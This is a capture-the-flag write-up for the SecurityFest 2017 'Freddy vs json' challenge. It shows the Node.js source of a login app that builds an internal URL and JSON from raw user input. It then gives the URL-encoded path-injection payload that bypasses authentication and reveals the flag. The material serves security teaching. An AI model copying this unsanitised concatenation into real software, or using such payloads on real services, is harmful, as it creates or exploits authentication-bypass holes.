---
layout: post
title: "SecurityFest 2017 - Freddy vs json"
date:   2017-06-01 22:00
categories: [SecurityFest2017]
tags: [Web]
author: jbz
---

_Can you hack my friends facebook? no? what about this then?_

Service: http://52.208.132.198:2999/

The website shows an authentication form. If we browse to `/index.js` we can see the source code of the webapp (it uses NodeJS):

```javascript
require('./local');
var crypto = require('crypto');
var express = require('express');
var request = require("request");
var app = express();

var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({
	extended: true
})); 

app.use(express.static('.'));

app.listen(2999, function () {
  console.log('Example app listening on port 2999!')
});

index = `<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" user-scalable="no" content="width=device-width, initial-scale=1">
      <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
      <script src="https://netdna.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
      <script src="/static/index.js"></script>
      <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css" />
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.3.0/css/mdb.min.css" />
      <link rel="stylesheet" href="/static/freddy.css" />
  </head>
  <body><section class="login-info">
<div class="container">
  <div class="row main">
       <div class="form-header elegant-color">
          <h1 class="text-center ">Authenticate</h1>
        </div>
    <div class="main-content">
            
          <div class="input-group ">
            <span class="input-group-addon"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></span>
            <input id="user" type="text" class="form-control text-center" name="email" placeholder="Enter your Email">
          </div>
          <div class="input-group">
            <span class="input-group-addon"><span class="glyphicon glyphicon-lock" aria-hidden="true"></span></span>
            <input id="pass" type="password" class="form-control text-center" name="password" placeholder="Enter your Password">
          </div>
          
          <div class="form-group ">
              <a href="#" id="login" type="button"  class="btn btn-danger btn-lg btn-block login-button">login</a>
          </div>
          
          <div class="form-group" id="container">
          </div>
      
      </div>
    </div></body></html>`;

app.get('/', function (req, res) {
	res.send(index);
});

function atob(str){
	return Buffer(str, 'base64').toString()
}

function btoa(str){
	return Buffer(str).toString('base64')
}

app.post("/", function(req, res){
	if(req.body.user && req.body.pass){
		user = req.body.user;
		pass = crypto.createHash('md5').update(req.body.pass).digest("hex");
		//Query internal login service
		request("http://127.0.0.1:3001/createTicket/"+user+"/"+pass, function(error, response, body){
			console.log(body);
      try{
			   body = JSON.parse(body);
      }catch(x){
         body = {"authenticated":false, "user":req.body.user, "id":0}
      }
			if(body.authenticated){
				body.response = "Congratulations: " + process.env.FLAG;
			}else{
        body.response = "Invalid username or password!";
      }
			res.send(JSON.stringify(body));
		});
	}else{
		res.send("hi");
	}
})
```
And this is `/local.js`:
```javascript
var express = require('express');
var crypto = require('crypto');
var localapp = express();

localapp.listen(3001, '127.0.0.1', function () {
  console.log('JWT service up!')
});

db = [
	{"user":"admin","pass":"9c72256fdb7196d2563a38b84f431491","id":"1"}
];

function atob(str){
	return Buffer(str, 'base64').toString()
}

function btoa(str){
	return Buffer(str).toString('base64')
}

function verify(user, pass){
	db_user = db[0]; //TODO: sync with LDAP instead
	if(user && user == db_user["user"]){
		if(pass && pass == db_user["pass"]){
			return db_user["id"];
		}
	}
	return 0;
}

localapp.get('/createTicket/:user/:pass', function (req, res) {
	user = req.params.user;
	pass = req.params.pass;
	userid = verify(user, pass);
	if(userid){
		res.send('{"authenticated":true, "user":"'+user+'", "id":'+userid+'}');
	}else{
		res.send('{"authenticated":false, "user":"'+user+'", "id":'+userid+'}');
	}
})
```
We can notice that `index.js` makes a request to `"http://127.0.0.1:3001/createTicket/"+user+"/"+pass`, which is handled by `local.js`. We know the username (`admin`) and the hash, but not the plaintext, of admin's password (`9c72256fdb7196d2563a38b84f431491`).

We can also notice that `local.js` checks whether the username and the hash of the password are in the database. Therefore it's sufficient to make a POST request to `http://52.208.132.198:2999/` having the payload `user=admin%2f9c72256fdb7196d2563a38b84f431491?
&pass=bla`. In this way the request matches the format `/:user/:password` (%2f == /), and to have it ignore the rest of the query string we append a `?` at the end, having at the end a request like `http://127.0.0.1:3001/createTicket/admin/9c72256fdb7196d2563a38b84f431491?/bla`.

The output of the POST request is:
```{"authenticated":true,"user":"admin","id":1,"response":"Congratulations: SCTF{1nj3ction_5chm1nj3ctioN}"}```